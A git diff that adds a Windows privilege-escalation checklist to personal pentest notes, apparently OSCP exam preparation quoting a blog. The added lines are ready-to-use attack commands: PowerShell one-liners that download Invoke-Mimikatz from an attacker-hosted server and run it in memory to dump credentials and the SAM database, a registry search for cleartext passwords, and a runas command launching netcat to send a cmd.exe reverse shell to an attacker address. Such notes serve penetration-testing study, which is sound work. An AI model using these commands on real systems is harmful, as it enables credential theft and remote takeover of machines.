@@ -1,6 +1,34 @@
 # windows privesc
 basic windows privilege escalation, since i have trouble parsing through the torrent of false-positives from standard tools
 
+### // privesc checklist
+```
+https://parzival.sh/blog/my-oscp-notes-and-resources
+    PowerShell Empire has some great PS1 scripts readily available such as Invoke-Watson and Invoke-MS16032 as examples. Their Mimikatz.ps1 is also great. These can be accessed at the following location Kali: /usr/share/powershell-empire/empire/server/data/module_source/
+    Use the following command to search for cleartext passwords in registry: reg query HKCU /f password /t REG_SZ /s
+    Be careful using commands ripped from other sites, make sure you understand what they are doing and how to modify them. An example for the previous note is modifying it to be more broad: reg query HKCU /f pass /t REG_SZ /s
+    Windows binaries are ready to go on Kali: /usr/share/windows-binaries
+    Fix your Windows path with the following command: set PATH=%SystemRoot%\system32;%SystemRoot%;
+    Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:
+
+powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
+powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam
+
+    Check out C:\Program Files (x86) for any outdated and vulnerable installations.
+    If Administrator credentials have been obtained but you can’t get an interactive shell then strongly consider using the runas command in combination with a binary like netcat: runas /env /profile /user:[DOMAIN]\Administrator "C:\Windows\Tasks\nc.exe -e cmd.exe $attackerip 443"
+    Mimikatz errors? Need to downgrade your version? Use the version availabke at this link.
+
+Additional Windows Privilege Escalation Resources
+
+Some additional resources I referenced throughout Windows privilege escalation
+
+    0x1 Gitlab
+    Juicy Potato Walkthrough
+    https://github.com/SecWiki/windows-kernel-exploits
+    Windows Exploit Suggester
+
+```
+
 ### // sitational awareness
 ```
 whoami /groups
